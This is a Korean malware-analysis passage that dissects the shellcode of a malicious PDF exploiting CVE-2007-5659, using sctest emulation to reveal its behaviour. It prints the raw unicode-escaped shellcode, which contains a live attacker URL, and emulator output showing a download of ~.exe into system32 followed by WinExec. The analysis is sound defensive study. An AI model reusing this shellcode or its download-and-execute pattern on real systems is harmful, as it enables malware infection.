%uf7ba%uff07%uefef%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec%u036c%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3%u9c64%u64d3%uf19b%uec97%ub91c%u9964%ueccf%udc1c%ua626%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b%u212e%uece2%uaf1d%u1e04%u11d4%u9ab1%ub50a%u0464%ub564%ueccb%u8932%ue364%u64a4%uf3b5%u32ec%ueb64%uec64%ub12a%u2db2%uefe7%u1b07%u1011%uba10%ua3bd%ua0a2%uefa1%u7468%u7074%u2F3A%u372F%u2E38%u3031%u2E39%u3033%u352E%u632F%u756F%u746E%u302F%u3530%u4441%u3635%u2F46%u6F6C%u6461%u702E%u7068%u703F%u6664%u613D%u3836%u6534%u6563%u6565%u3637%u6366%u3235%u3732%u3337%u3832%u6136%u3938%u6235%u3863%u3334%u0036
`
<br><br>
다음 쉘코드를 분석하기 위해 exe파일로 변환하여 분석하는 방법을 사용함. 자바스크립트에서 핵심이 되는 쉘코드를 추출하여 shell_unicode에 저장함.

```shell
cat shellcode_unicode | unicode2raw > shellcode.raw
cat shellcode.raw | sctest -Svs 10000000 > sctest-out.txt
more sctest-out.txt
verbose = 1
Hook me Captain Cook!
userhooks.c:132 user_hook_ExitThread
ExitThread(-1)
stepcount 314321
HMODULE LoadLibraryA (
     LPCTSTR lpFileName = 0x00417193 => 
           = "URLMON";
) = 0x7df20000;
UINT GetSystemDirectory (
     LPTSTR lpBuffer = 0x00416c1e => 
           = "c:\WINDOWS\system32";
     UINT uSize = 255;
) =  19;
ERROR  DeleteFile (
     LPCTSTR lpFileName = 0x00416c1e => 
         none;
) =  -1;
HRESULT URLDownloadToFile (
     LPUNKNOWN pCaller = 0x00000000 => 
         none;
     LPCTSTR szURL = 0x0041719a => 
           = "http://78.109.30.5/count/005AD56F/load.php?pdf=a684eceee76fc522773286a895bc8436";
     LPCTSTR szFileName = 0x00416c1e => 
           = "c:\WINDOWS\system32\~.exe";
     DWORD dwReserved = 0;
     LPBINDSTATUSCALLBACK lpfnCB = 0;
) =  0;
UINT WINAPI WinExec (
     LPCSTR lpCmdLine = 0x00416c1e => 
           = "c:\WINDOWS\system32\~.exe";
     UINT uCmdShow = 0;
) =  32;
void ExitThread (
     DWORD dwExitCode = -1;
) =  0;
```


쉘코드를 sctest 에뮬레이터에서 실행할 경우 전반적인 악성 행위를 확인할 수 있음. 따라서 unicode로 되어 있는 쉘코드를 raw데이터로 변환한 뒤 sctest 에뮬레이터에서 실행함.
- LoadLibrary() 함수를 이용해서 urlmon.dll 로드
- GetSystemDirectory() 함수로 system32 경로 획득
- 기존에 악성코드가 존재할 경우 DeleteFile() 함수로 악성코드 제거
- urlmon.dll에 있는 URLDownloadToFile() 함수로 공격자 서버에서 system32 경로에 ~.exe의 이름으로 악성코드 다운로드
- WinExec() 함수로 다운받은 악성코드 실행
- 쉘코드 종료

### 7-5 정리

badpdf.pdf는 CVE-2007-5659 취약점을 이용하여 공격하는 다운로더형 악성코드로, 파일 실행 시 내부에 있는 악성 자바스크립트가 실행되며 악성 자바스크립트에는 사용자가 Adobe Reader와 Acrobat 8.1.1 및 그 이전 버전을 사용하는 경우 Heap spray 기법을 사용하여 쉘코드를 실행함.

쉘코드가 실행되면 "http[:]//78[.]109[.]30[.]5/count/005AD56F/load[.]php?pdf=a684eceee76fc522773286a895bc8436"에서 추가로 악성코드를 다운받도록 구성되어 있음.

